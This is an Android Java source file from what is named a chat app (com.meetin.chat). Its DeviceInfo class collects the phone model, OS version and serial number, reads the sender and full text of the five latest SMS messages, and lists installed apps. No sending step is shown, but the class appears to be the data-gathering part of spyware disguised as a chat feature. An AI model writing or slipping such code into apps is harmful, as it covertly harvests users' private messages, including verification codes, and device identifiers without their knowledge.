package com.meetin.chat;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Telephony;
import java.util.List;

public class DeviceInfo {
    public static String getInfo(Context ctx) {
        return "Model: " + Build.MODEL +
               "\nAndroid: " + Build.VERSION.RELEASE +
               "\nDevice ID: " + Build.MODEL.replace(" ", "_") + "|" + Build.SERIAL;
    }

    public static String readSms(Context ctx) {
        try {
            Uri uri = Telephony.Sms.CONTENT_URI;
            String[] projection = {"address", "body"};
            Cursor cursor = ctx.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 5");
            if (cursor == null) return "No SMS";
            StringBuilder sb = new StringBuilder("SMS:\n");
            while (cursor.moveToNext()) {
                sb.append(cursor.getString(0)).append(": ").append(cursor.getString(1)).append("\n");
            }
            cursor.close();
            return sb.toString();
        } catch (Exception e) {
            return "SMS error";
        }
    }

    public static String getApps(Context ctx) {
        PackageManager pm = ctx.getPackageManager();
        List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
        StringBuilder sb = new StringBuilder("Apps:\n");
        for (int i = 0; i < Math.min(10, packages.size()); i++) {
            sb.append(packages.get(i).packageName).append("\n");
        }
        return sb.toString();
    }
}
